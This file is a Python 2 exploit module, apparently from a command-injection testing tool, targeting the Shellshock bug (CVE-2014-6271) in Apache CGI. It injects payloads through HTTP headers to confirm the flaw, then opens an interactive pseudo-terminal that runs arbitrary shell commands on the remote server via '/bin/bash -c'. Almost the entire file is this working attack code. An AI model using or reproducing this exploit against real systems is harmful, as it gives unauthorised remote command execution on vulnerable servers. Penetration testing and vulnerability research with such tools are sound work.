#!/usr/bin/env python

import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

"""
This module exploits the vulnerability CVE-2014-6271 [1] in Apache CGI.
[1] https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
"""

# Available HTTP headers
headers = ["User-Agent","Referer"]

# Shellshock Payloads
classic_payload = "() { :;}; echo 'Shellshocked:Done';"

def classic_check(url,http_request_method):
    injection_type = "results-based command injection"
    technique = "classic shellshock injection technique"
    shellshoked = False
    try: 
        for check_header in headers:
            header = {check_header : classic_payload}
            request = urllib2.Request(url, None, header)
            response = urllib2.urlopen(request)
            if 'Shellshocked' in response.info():
                check_result = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                shellshoked = True
                break
            else:
                check_result = Fore.RED + "FAILED" + Style.RESET_ALL
                continue

        sys.stdout.write("\r(*) Testing the "+ technique + " [ " + check_result  + " ]")
        sys.stdout.flush()
        if shellshoked == True:
            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + "\"" + classic_payload + "\"" + Style.RESET_ALL

            if menu.options.os_cmd:
               cmd = menu.options.os_cmd 
               classic_cmd_exec(url,cmd)
            else:
                classic_input_cmd(url,http_request_method)
        else:
            print ""
            sys.exit(0)

    except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

    except urllib2.URLError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

def classic_input_cmd(url,http_request_method):
    while True:
      gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
      if gotshell in settings.CHOISE_YES:
          print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
          while True:
            try:
              cmd = raw_input("Shell > ")
              if cmd == "q":
                os._exit(0)
              else: 
                classic_cmd_exec(url,cmd)

            except KeyboardInterrupt:
              print ""
              os._exit(0)

            except:
              print ""
              os._exit(0)

def classic_cmd_exec(url,cmd):
    for check_header in headers:
        try:
            header = { check_header : '() { :;}; /bin/bash -c "' + cmd + '"'}
            request = urllib2.Request(url, None, header)
            response = urllib2.urlopen(request)
            sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
            print response.read().rstrip()
            sys.stdout.write("\n" + Style.RESET_ALL)
            break

        except urllib2.HTTPError, err:
            # Give a second chance to execute it.
            if err.code == 500:
                try:
                    header = {check_header : classic_payload + " echo; "+ cmd}
                    request = urllib2.Request(url, None, header)
                    response = urllib2.urlopen(request)
                    sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
                    print response.read().rstrip()
                    sys.stdout.write("\n" + Style.RESET_ALL)
                    break

                except urllib2.HTTPError, err:
                    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

        except urllib2.URLError, err:
            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

def shellshock_handler(url,http_request_method):       
    classic_check(url,http_request_method)

if __name__ == "__main__":
  shellshock_handler(url,http_request_method)